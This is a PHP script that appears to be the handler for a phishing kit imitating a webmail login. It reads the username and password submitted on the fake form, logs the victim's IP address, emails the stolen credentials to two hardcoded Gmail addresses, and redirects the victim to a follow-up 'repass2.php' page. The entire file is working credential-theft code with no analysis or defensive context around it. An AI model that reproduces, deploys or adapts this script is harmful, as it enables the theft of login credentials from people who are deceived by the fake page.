<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$to = '
harrisgriffin247@gmail.com';
$subject = getenv("REMOTE_ADDR");
$from = "From: TRIGGAR <Austraia>";

$attuser = $_POST['user'];
$attpassword = $_POST['pass'];
$mail_server = 'Webmail';
$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
			.'**************************************'."\n"
			.'email: '.$attuser."\n"
			.'Password: '.$attpassword."\n"
			.'UserIp: '.$ip."\n";




mail($to, $subject, $comment, $from);

$to = '
olfelixer@gmail.com';
$subject = getenv("REMOTE_ADDR");
$from = "From: TRIGGAR <Austraia>";

$attuser = $_POST['user'];
$attpassword = $_POST['pass'];
$mail_server = 'Webmail';
$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
			.'**************************************'."\n"
			.'email: '.$attuser."\n"
			.'Password: '.$attpassword."\n"
			.'UserIp: '.$ip."\n";




mail($to, $subject, $comment, $from);
header("Location: repass2.php?user=$attuser");

?>